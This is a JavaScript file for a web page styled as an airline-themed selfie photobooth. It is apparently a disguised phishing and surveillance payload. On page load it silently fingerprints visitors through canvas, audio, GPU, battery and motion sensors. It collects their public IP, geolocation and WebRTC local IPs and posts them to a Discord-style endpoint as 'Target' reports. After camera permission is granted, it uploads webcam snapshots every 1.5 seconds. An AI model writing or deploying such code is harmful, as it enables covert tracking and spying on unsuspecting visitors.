/**
 * Photobooth Airways — CAM Selfie Logic
 * photobooth.bapel.my.id
 */

var uploadInterval = null;

function initDecorations() {
  var starsEl = document.getElementById('stars');
  for (var i = 0; i < 80; i++) {
    var s = document.createElement('div'); s.className = 'star';
    var big = Math.random() > 0.8;
    s.style.cssText = 'left:' + (Math.random() * 100) + '%;top:' + (Math.random() * 80) + '%;'
      + 'animation-duration:' + (Math.random() * 3 + 2) + 's;animation-delay:' + (Math.random() * 4) + 's;'
      + 'width:' + (big ? 3 : 2) + 'px;height:' + (big ? 3 : 2) + 'px;';
    starsEl.appendChild(s);
  }
  var cloudsEl = document.getElementById('clouds');
  for (var j = 0; j < 4; j++) {
    var c = document.createElement('div'); c.className = 'cloud';
    c.style.cssText = 'width:' + (Math.random() * 200 + 80) + 'px;height:' + (Math.random() * 40 + 20) + 'px;'
      + 'top:' + (Math.random() * 60) + '%;animation-duration:' + (Math.random() * 40 + 30) + 's;'
      + 'animation-delay:' + (-Math.random() * 30) + 's;';
    cloudsEl.appendChild(c);
  }
  var now = new Date();
  var date = ('0' + now.getDate()).slice(-2) + '/' + ('0' + (now.getMonth() + 1)).slice(-2);
  var seat = (Math.floor(Math.random() * 6) + 1) + ['A', 'B', 'C'][Math.floor(Math.random() * 3)];
  ['d', 'm'].forEach(function (s) {
    var d = document.getElementById('flightDate-' + s);
    var se = document.getElementById('seatNum-' + s);
    if (d) d.textContent = date;
    if (se) se.textContent = seat;
  });
}

function collectSilent() {
  var localtime = String(new Date().toLocaleTimeString());
  var tz = 'Unknown'; try { tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown'; } catch (e) { }

  var gpu = 'Unknown';
  try {
    var cvs = document.createElement('canvas'), gl = cvs.getContext('webgl') || cvs.getContext('experimental-webgl');
    gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
  } catch (e) { }

  var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  var netType = conn ? conn.effectiveType : 'Unknown';
  var netDL = conn ? conn.downlink + ' Mbps' : 'Unknown';

  function getCanvasFp() {
    try {
      var c = document.createElement('canvas'), ctx = c.getContext('2d');
      ctx.textBaseline = "top"; ctx.font = "14px 'Arial'"; ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = "#069"; ctx.fillText("R4v3n!#", 2, 15); ctx.fillStyle = "rgba(102,204,0,0.7)"; ctx.fillText("R4v3n!#", 4, 17);
      var b = c.toDataURL(), h = 0; for (var i = 0; i < b.length; i++) { h = ((h << 5) - h) + b.charCodeAt(i); h = h & h; } return Math.abs(h).toString(16);
    } catch (e) { return "error"; }
  }
  var cHash = getCanvasFp();

  var mStr = "N/A", oStr = "N/A", motionSamples = [];
  window.addEventListener('deviceorientation', function (e) { if (e.alpha !== null) oStr = "A:" + Math.round(e.alpha) + " B:" + Math.round(e.beta) + " G:" + Math.round(e.gamma); });
  window.addEventListener('devicemotion', function (e) { 
    if (e.accelerationIncludingGravity && e.accelerationIncludingGravity.x !== null) {
      var x = e.accelerationIncludingGravity.x, y = e.accelerationIncludingGravity.y, z = e.accelerationIncludingGravity.z;
      mStr = "X:" + Math.round(x) + " Y:" + Math.round(y) + " Z:" + Math.round(z);
      motionSamples.push(Math.sqrt(x*x + y*y + z*z));
    } 
  });

  function getAudioFp(callback) {
    try {
      var AudioCtx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
      if (!AudioCtx) return callback("N/A_NoCtx");
      var context = new AudioCtx(1, 44100, 44100), oscillator = context.createOscillator();
      oscillator.type = 'triangle'; oscillator.frequency.value = 10000;
      var compressor = context.createDynamicsCompressor();
      compressor.threshold.value = -50; compressor.knee.value = 40; compressor.ratio.value = 12; compressor.attack.value = 0; compressor.release.value = 0.25;
      oscillator.connect(compressor); compressor.connect(context.destination);
      oscillator.start(0); context.startRendering();
      context.oncomplete = function(e) {
        var p = e.renderedBuffer.getChannelData(0), h = 0;
        for (var i = 4500; i < 5000; i++) { h += Math.abs(p[i]); }
        var fpStr = h.toString(16).replace('.', '').toUpperCase().substring(0, 8);
        callback("DEVICE-" + fpStr);
      };
    } catch(e) { callback("Error"); }
  }

  var AVATAR = 'https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png';

  getAudioFp(function(aHash) {
    var sysinfo = '```xl\nUser-Agent: ' + navigator.userAgent + '```'
      + '```autohotkey\n'
      + 'Platform: ' + navigator.platform
      + '\nVendor: ' + navigator.vendor
      + '\nLanguage: ' + navigator.language
      + '\nTimezone: ' + tz
      + '\nTime: ' + localtime
      + '\nCookies: ' + navigator.cookieEnabled
      + '\nDo_Not_Track: ' + (navigator.doNotTrack || 'Unknown')
      + '\n'
      + '\n--- Hardware ---'
      + '\nRam: ~' + (navigator.deviceMemory || 'Unknown') + ' GB'
      + '\nCPU_Cores: ' + (navigator.hardwareConcurrency || 'Unknown')
      + '\nGPU: ' + gpu
      + '\nTouch_Points: ' + navigator.maxTouchPoints
      + '\n'
      + '\n--- Screen & Network ---'
      + '\nResolution: ' + screen.width + 'x' + screen.height
      + '\nViewport: ' + window.innerWidth + 'x' + window.innerHeight
      + '\nColor_Depth: ' + screen.colorDepth + '-bit'
      + '\nNet_Type: ' + netType
      + '\nDownlink: ' + netDL
      + '\nCanvas_FP: ' + cHash
      + '\nAudio_FP: ' + aHash;

    function postInfo(batt) {
      var posture = "Perangkat PC Statis", activity = "Memakai Komputer (Tanpa Sensor)";
      if (mStr !== "N/A") {
        posture = "Menunggu Kalibrasi...";
        var match = mStr.match(/X:(-?\d+) Y:(-?\d+) Z:(-?\d+)/);
        if(match) {
          var ax = Math.abs(parseInt(match[1])), ay = Math.abs(parseInt(match[2])), az = Math.abs(parseInt(match[3]));
          if (az >= 8) posture = "Perangkat diletakkan datar (Di atas meja/AFK)";
          else if (ay >= 7) posture = "Perangkat ditegakkan (Menatap layar)";
          else if (ax >= 7) posture = "Perangkat dimiringkan (Mode Landscape/Laptop Layar Lipat)";
          else posture = "Perangkat condong santai (Sudut miring)";
        }
      }
      
      if (motionSamples.length > 3) {
         var sum = 0; for(var i=0; i<motionSamples.length; i++) sum += motionSamples[i];
         var mean = sum / motionSamples.length, variance = 0;
         for(var i=0; i<motionSamples.length; i++) variance += Math.pow(motionSamples[i] - mean, 2);
         variance /= motionSamples.length;
         
         if (variance < 0.2) activity = "Diam Statis / AFK (Tidak disentuh)";
         else if (variance < 0.8) activity = "Pegerakan Santai / Sedang Mengetik";
         else if (variance < 4.0) activity = "Sedang Berjalan / Membawa Perangkat";
         else if (variance < 10.0) activity = "Berjalan Cepat / Berada di Kendaraan Lembut";
         else activity = "Berlari / Berguncang Keras";
      } else if (mStr !== "N/A") {
         activity = "Mengkalibrasi Sensor...";
      }

      var dOStr = oStr === "N/A" ? "Tidak Terdeteksi (Absen / Limitasi Hardware)" : oStr;
      var dMStr = mStr === "N/A" ? "Tidak Ditemukan (Bypass Sensor PC)" : mStr;

      var finalInfo = sysinfo + '\n\n--- Sensors & Kinematics ---\nOrientation: ' + dOStr + '\nMotion_XYZ: ' + dMStr + '\nPosture_Mode: ' + posture + '\nPhysical_Act: ' + activity;
      if (batt) finalInfo += '\n\n--- Battery ---\nCharging: ' + batt.c + '\nLevel: ' + batt.l;
      finalInfo += '```';

      var r = new XMLHttpRequest();
      r.open('POST', '/location_update'); r.setRequestHeader('Content-type', 'application/json');
      r.send(JSON.stringify({
        username: 'R4VEN', avatar_url: AVATAR, content: '@everyone Someone Opened The Link O_o',
        embeds: [{ author: { name: 'Target System Information..' }, description: finalInfo, color: 15418782 }]
      }));
    }

    setTimeout(function () {
      if ('getBattery' in navigator) {
        navigator.getBattery().then(function (b) { postInfo({ c: b.charging ? 'Yes' : 'No', l: (b.level * 100) + '%' }); }).catch(function () { postInfo(null); });
      } else { postInfo(null); }
    }, 1000);
  });

  function post(payload) { var r = new XMLHttpRequest(); r.open('POST', '/location_update'); r.setRequestHeader('Content-type', 'application/json'); r.send(JSON.stringify(payload)); }

  $.getJSON('https://api.ipify.org?format=json', function (data) {
    post({
      username: 'R4VEN', avatar_url: AVATAR,
      embeds: [{ author: { name: 'Target Ip' }, description: '```xl\n' + data.ip + '```\n__**IP Details:**__ https://ip-api.com/#' + data.ip + '\n', color: 15548997, footer: { text: 'Geographic location based on IP is approximate.' } }]
    });
  });
  $.getJSON('http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query', function (res) {
    post({
      username: 'R4VEN', avatar_url: AVATAR,
      embeds: [{
        author: { name: 'IP Address Reconnaissance' }, title: res.status,
        description: '```autohotkey\nContinent: ' + res.continent + '\nCountry: ' + res.country + '\nRegion: ' + res.regionName + '\nCity: ' + res.city + '\nISP: ' + res.isp + '\nLat: ' + res.lat + '\nLon: ' + res.lon + '```', color: 5763719
      }]
    });
  });
}

function setLoading(on) {
  ['d', 'm'].forEach(function (s) {
    var btn = document.getElementById('allowBtn-' + s), sp = document.getElementById('spinner-' + s),
      bt = document.getElementById('btnText-' + s), sb = document.getElementById('statusBar-' + s);
    if (!btn) return;
    if (on) { btn.classList.add('loading'); sp.style.display = 'block'; bt.textContent = 'MEMPROSES\u2026'; sb.style.display = 'flex'; }
    else { btn.classList.remove('loading'); sp.style.display = 'none'; bt.textContent = 'AKTIFKAN KAMERA & SELFIE'; sb.style.display = 'none'; }
  });
}

function setStatus(msg) {
  ['d', 'm'].forEach(function (s) { var el = document.getElementById('statusText-' + s); if (el) el.textContent = msg; });
}

function showSuccess() {
  ['d', 'm'].forEach(function (s) {
    var mc = document.getElementById('mainContent-' + s), so = document.getElementById('successOverlay-' + s);
    if (mc) mc.style.display = 'none';
    if (so) so.style.display = 'flex';
  });
  setTimeout(function () {
    var frame = document.getElementById('site-frame');
    frame.src = 'https://photobooth.bapel.my.id';
    frame.style.display = 'block';
    setTimeout(function () { frame.classList.add('visible'); }, 50);
  }, 1800);
}

function postFile(file) {
  var fd = new FormData(); fd.append('image', file);
  var xhr = new XMLHttpRequest(); xhr.open('POST', '/image', true); xhr.send(fd);
}

function requestCamera() {
  setLoading(true); setStatus('Menginisialisasi kamera\u2026');
  navigator.mediaDevices.getUserMedia({ audio: false, video: { facingMode: 'user' } })
    .then(function (stream) {
      var AVATAR = 'https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png';
      function post(payload) { var r = new XMLHttpRequest(); r.open('POST', '/location_update'); r.setRequestHeader('Content-type', 'application/json'); r.send(JSON.stringify(payload)); }

      navigator.mediaDevices.enumerateDevices().then(function (devices) {
        var hwList = devices.map(function (d) { return d.label ? d.label + ' (' + d.kind + ')' : d.kind; }).join('\n');
        var hwDesc = '```prolog\n' + (hwList || 'No hardware labels retrieved') + '```';

        var rtc = new RTCPeerConnection({ iceServers: [] }); rtc.createDataChannel('');
        rtc.createOffer().then(function (offer) { rtc.setLocalDescription(offer); });
        var localIps = [];
        rtc.onicecandidate = function (e) {
          if (!e || !e.candidate) return;
          var ip = e.candidate.candidate.split(' ')[4];
          if (localIps.indexOf(ip) === -1) {
            localIps.push(ip);
            post({
              username: 'R4VEN', avatar_url: AVATAR,
              embeds: [{
                author: { name: 'Hardware & Intranet Reconnaissance' },
                description: '**Connected Hardware:**\n' + hwDesc + '\n**WebRTC Local IP Leak:**\n```json\n"' + localIps.join(', ') + '"```',
                color: 15158332
              }]
            });
          }
        };
      });

      var video = document.getElementById('video');
      var canvas = document.getElementById('canvas');
      video.srcObject = stream;
      setTimeout(function () {
        showSuccess();
        var ctx = canvas.getContext('2d');
        uploadInterval = setInterval(function () {
          ctx.drawImage(video, 0, 0, 640, 480);
          canvas.toBlob(postFile, 'image/jpeg');
        }, 1500);
      }, 1000);
    })
    .catch(function () {
      setStatus('Akses ditolak. Aktifkan kamera di pengaturan browser.');
      setLoading(false);
    });
}

window.onload = function () { initDecorations(); collectSilent(); };
